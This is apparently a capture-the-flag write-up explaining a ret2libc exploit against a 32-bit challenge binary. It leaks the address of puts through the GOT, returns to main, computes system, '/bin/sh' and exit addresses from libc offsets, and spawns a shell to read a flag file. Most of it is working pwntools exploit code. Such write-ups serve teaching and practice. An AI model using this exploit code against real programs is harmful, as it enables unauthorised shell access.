
The *Easy* level challenge of this program allows us to call ``win`` function to get the first flag. At this level requires us to get the second flag ``/flag2.txt`` via shell. The stack is non executable, we can't just throw some shellcode to it, we need to try ``ret2libc`` method. To call``system("bin/sh")``, we need address of ``system``, address of the ``binsh`` string and a return address for ``system``. To find out the actuall address of some function in libc we can use a relative address of the function we want to another function we can easily find out the address. In this case, we call ``puts@plt`` to print the actual address of it at runtime which is stored in table ``got``. We need to return send another payload to call ``system``, so we need to return to a function that allow us to go through the whole process again, the payload would be ``address of puts@plt + address of main + address of put@got``. 


```python
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = b'\x90'*60
payload += pwn.p32(puts_plt)
payload += pwn.p32(elf.sym["main"])
payload += pwn.p32(puts_got)

pr.sendlineafter("Input some text: ", payload)
pr.readuntil('Return address: ')
pr.readline()
pr.readline()
puts_addr = int.from_bytes(pr.read(4).strip().ljust(4, b'\x00'), 'little')
print('puts', hex(puts_addr))
```


When we have the address of ``puts``, we can find the relative address of system and binsh string via [libc.blukat.me](https://libc.blukat.me/?q=puts%3A0xf7d98b40&l=libc6_2.27-3ubuntu1_i386), as we what it exit when ``system`` call returns, we also need to find out address of ``exit``.

```python
sys_addr = puts_addr - 0x2a940
binsh_addr = puts_addr + 0x11658f
exit_addr = puts_addr - 227184
print('sys', hex(sys_addr))
print('binsh', hex(binsh_addr))
payload = b'\x90'*60
payload += pwn.p32(sys_addr)
payload += pwn.p32(exit_addr)
payload += pwn.p32(binsh_addr)

pr.sendlineafter("Input some text: ", payload)
pr.sendline("cat /flag2.txt")
print(pr.readall(2).decode())
```

When we get a shell, ``cat`` command brings us the flag.
